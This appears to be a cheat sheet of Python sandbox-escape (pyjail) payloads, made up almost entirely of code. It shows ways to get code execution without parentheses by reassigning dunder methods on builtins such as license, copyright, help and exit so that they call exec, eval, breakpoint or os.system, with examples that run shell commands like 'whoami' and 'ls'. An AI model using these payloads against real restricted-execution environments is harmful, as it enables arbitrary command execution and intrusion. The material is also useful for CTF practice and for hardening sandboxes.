```py -cwn
# list comprehension (exec & eval)
[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]]
[obj["print(123)"] for obj.__class__.__getitem__ in [eval]]

# from builtin modules (exec & eval) - <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>
[f"{license}" for license._Printer__setup in [breakpoint]]

# Some other ways to bypass the parenthesis
[f"{copyright}" for copyright.__class__.__str__ in [breakpoint]]
[+license for license.__class__.__pos__ in [breakpoint]]
[-quit for quit.__class__.__neg__ in [breakpoint]]
[help["ls"] for help.__class__.__getitem__ in [system]]
[[copyright.sh]for[[[copyright.__class__.__getattr__]]]in[[[[copyright.os.system]for[copyright.__class__.__getattr__]in[[__import__]]]]]]
[[help[quit[license]]]for[help.__class__.__getitem__]in[[eval]for[quit.__class__.__getitem__]in[[input]]]]
[[[help[quit[[]]]]for[quit.__class__.__getitem__]in[[input]]]for[help.__class__.__getitem__]in[[eval]]]

# @hashkitten (exec)
from os import system as __getattr__; from __main__ import sh

# ADD - String Addition
exit.__class__.__add__ = exec; exit + "import os; os.system\x28'whoami'\x29"
# SUB - String Subtraction
exit.__class__.__sub__ = exec; exit - "import os; os.system\x28'whoami'\x29"
# MUL - String Multiplication
exit.__class__.__mul__ = exec; exit * "import os; os.system\x28'whoami'\x29"
# DIV - String Division
exit.__class__.__div__ = exec; exit / "import os; os.system\x28'whoami'\x29"
# MOD - String Modulo
exit.__class__.__mod__ = exec; exit % "import os; os.system\x28'whoami'\x29"

# property bypass
class Test:
   @property
   def aFunction(self):
        print("you called this function")
test = Test()
test.aFunction


```